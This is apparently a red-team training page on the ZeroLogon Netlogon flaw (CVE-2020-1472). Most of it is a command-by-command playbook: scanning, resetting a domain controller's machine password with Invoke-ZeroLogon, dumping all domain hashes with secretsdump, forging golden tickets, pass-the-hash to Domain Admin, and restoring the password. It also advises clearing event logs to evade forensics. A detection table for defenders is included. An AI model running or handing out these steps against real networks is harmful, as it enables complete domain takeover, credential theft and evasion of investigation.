---
layout: training-page
title: "ZeroLogon (CVE-2020-1472) — Red Team Academy"
module: "Active Directory"
tags:
  - zerologon
  - cve-2020-1472
  - netlogon
  - domain-controller
  - dc-sync
  - bc-security
page_key: "ad-zerologon"
render_with_liquid: false
---

# ZeroLogon — CVE-2020-1472

ZeroLogon is a cryptographic flaw in the **Netlogon Remote Protocol** (MS-NRPC) authentication scheme. The AES-CFB8 IV is always zero, which lets an attacker set the DC's machine-account password to an empty value by sending ~256 forged `NetrServerAuthenticate3` calls from *any host* on the network, with *no credentials*, in under 3 seconds.

Once the DC's machine account has an empty password, the attacker can DCSync the domain (secretsdump with `-no-pass`), extract the `krbtgt` hash, forge tickets, and own the forest. Then they *must* restore the original DC password or AD replication breaks domain-wide.

**Patch status**: Microsoft shipped a two-phase patch (Aug 2020 enforced, Feb 2021 enforcement). If the DC is fully patched and `FullSecureChannelProtection=1` is set, ZeroLogon is mitigated. Unpatched or partially-patched DCs remain vulnerable.

## Detection in the Lab

```
# netexec — quick vuln check:
netexec smb 10.0.0.10 -M zerologon

# PowerShell scan (non-destructive — does not change the password):
Invoke-ZeroLogon -Target dc01.corp.local
# Output: "Vulnerable" or "Not Vulnerable"
```

## Full Exploitation — BC-SECURITY Invoke-ZeroLogon

BC-SECURITY's PowerShell port (adapted from NCC Group's C# release) does both scan and exploit from a single script. The script is a direct Invoke-based wrapper around Secura's original research — no external dependencies beyond PowerShell 5+.

```
# Load from disk (on an attacker machine with line-of-sight to the DC):
Import-Module .\Invoke-ZeroLogon.ps1

# --- SCAN MODE (default) ---
Invoke-ZeroLogon -Target dc01.corp.local
# Prints "Vulnerable" / "Not Vulnerable" and exits.

# --- EXPLOIT MODE ---
# Reset the DC machine-account password to an empty NTLM hash:
Invoke-ZeroLogon -Target dc01.corp.local -Command reset

# The DC short name (NetBIOS) is the target, not the FQDN.
# If the DC is DC01.CORP.LOCAL, the Netlogon target is "DC01".
```

## Post-Exploitation — Pivot to Domain Admin

With the DC machine password now empty, dump the domain:

```
# Impacket secretsdump using empty password on DC$:
secretsdump.py -no-pass -just-dc 'CORP/DC01$@dc01.corp.local'
# → krbtgt NTLM hash, Administrator hash, every user hash

# Golden ticket:
ticketer.py -nthash KRBTGT_NTLM -domain-sid S-1-5-21-... -domain corp.local Administrator

# Or pass-the-hash straight to Domain Admin:
psexec.py -hashes :ADMIN_NT 'CORP/Administrator@dc01.corp.local'
```

## Restore the DC Password — MANDATORY

**Do not skip this step.** An empty DC machine password breaks domain replication, GPO processing, and Kerberos trust. Every ZeroLogon run must end with a restore.

```
# Extract the original machine hash from NTDS while you're still in there:
secretsdump.py -no-pass -just-dc-user 'DC01$' 'CORP/DC01$@dc01.corp.local'
# → hash:aad3b435b51404eeaad3b435b51404ee:ORIGINAL_HASH:::

# Restore using reinstall_original_pw.py (Secura / Impacket fork):
python3 reinstall_original_pw.py DC01 10.0.0.10 ORIGINAL_HASH

# Or via Impacket directly:
python3 restorepassword.py CORP/DC01@DC01 -target-ip 10.0.0.10 -hexpass ORIGINAL_HASH
```

If you cannot restore the password (e.g., you were SYSTEM-cleaned mid-run), the DC will self-heal on the next machine-account password rotation (~30 days) but will fail replication until then.

## Detection Signals (for the blue team reading this)

| Event | Source | What it indicates |
|-------|--------|-------------------|
| 4742 — Computer account changed | Windows Security on DC | DC$ account modified — should *only* happen from a peer DC |
| 5805 — NETLOGON session setup failure | Windows System | Hundreds of rapid-fire failures immediately before success = brute-forced IV |
| Netlogon `NetrServerAuthenticate3` RPC spike | DC packet capture | 256+ auth attempts in < 10s against a single DC name |
| MDI — "Suspected Netlogon privilege elevation attempt (CVE-2020-1472 exploitation)" | Microsoft Defender for Identity | Direct detection |
| Empty DC machine-password hash in `ntds.dit` | SIEM hash-watching | The `aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0` hash for DC$ should never appear |

The OPSEC hole most attackers forget: even a successful ZeroLogon run leaves 5805 spam in the System log for ~30 seconds. Unless you clear the event log quickly, post-engagement forensics will still pin you.

## Resources

- BC-SECURITY Invoke-ZeroLogon — `github.com/BC-SECURITY/Invoke-ZeroLogon`
- Secura CVE-2020-1472 whitepaper — `secura.com/whitepaper/zerologon`
- NCC Group C# PoC — `github.com/nccgroup/netlogon`
- Impacket restorepassword — `github.com/SecureAuthCorp/impacket/blob/master/examples/reinstall_original_pw.py`
- Microsoft KB4557222 (patch guidance) — Netlogon secure channel enforcement
- MITRE ATT&CK T1068 (Exploitation for Privilege Escalation)
